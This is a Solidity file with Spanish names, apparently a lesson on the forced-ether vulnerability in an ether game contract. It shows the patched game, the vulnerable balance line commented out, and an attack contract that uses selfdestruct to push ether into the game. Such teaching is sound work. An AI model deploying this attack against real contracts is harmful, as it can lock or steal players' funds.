// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract JuegoDelEther{
    uint public montoMaximoDelJuego = 5 ether;
    address public ganador;
    uint private saldo; // solución segura

    function jugar() public payable {
        require(msg.value == 1 ether, "Puedes enviar exactamene 1 ether");

        // uint saldo = address(this).balance; // vulnerabilidad
        saldo += msg.value;
        require(saldo <= montoMaximoDelJuego, "El juego ha terminado");

        if(saldo == montoMaximoDelJuego) {
            ganador = msg.sender;
        }
    }

    function reclamarElPremio() public {
        require(msg.sender == ganador, "No eres un ganador");

        (bool enviado, ) = msg.sender.call{value: address(this).balance}("");
        require(enviado, "Error enviando ether");
    }
}

contract ContratoAtaque {
    JuegoDelEther juegoDelEther;

    constructor(JuegoDelEther _juegoDelEther){
        juegoDelEther = JuegoDelEther(_juegoDelEther);
    }

    function ataque() public payable {
        address payable direccionDelContratoAAtacar = payable(address(juegoDelEther));
        selfdestruct(direccionDelContratoAAtacar);
    }

    function getSaldo() public view returns(uint){
        return address(this).balance;
    }

    function valor() public pure returns(uint){
        return 99;
    }

    function verSiExiste() public pure returns(string memory){
        return "existe";
    }
}